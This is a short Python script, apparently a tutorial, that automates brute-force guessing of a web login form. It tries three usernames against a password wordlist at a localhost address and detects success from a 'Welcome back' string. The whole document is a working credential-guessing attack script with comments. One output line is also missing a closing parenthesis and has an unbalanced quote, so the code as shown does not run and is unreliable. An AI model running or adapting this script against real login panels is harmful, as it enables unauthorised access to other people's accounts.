# web login form brute forcing
# automating the brute forcing on a login panel of a web page

import requests
import sys

target = "http://127.0.0.1:5000"      # suppose we have a login panel at the given link at localhost
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back"     # suppose we get the given needle after login which indicated successful login

for username in usernames:
	with open(passwords, "r") as passwords_list:     # open and read the file and asign the contents to passwords_list
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
			sys.stdout.flush()        # required to flush the buffer after each write
			r = requests.post(target, data={"username": username, "password": password})   # get response on making the given request
			if needle.encode() in r.content:      # check if the given needle is in the content of the response to demonstrate successful authentication
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{} found for user '{}'!".format(password.decode(), username)
				sys.exit()   # exit the process when password is found
		sys.stdout.flush()      # if password is not found for the users, flush the buffer
		sys.stdout.write("\n")   # write a new line
		sys.stdout.write("\tNo password found for '{}'!".format(username))
		sys.stdout.write("\n")
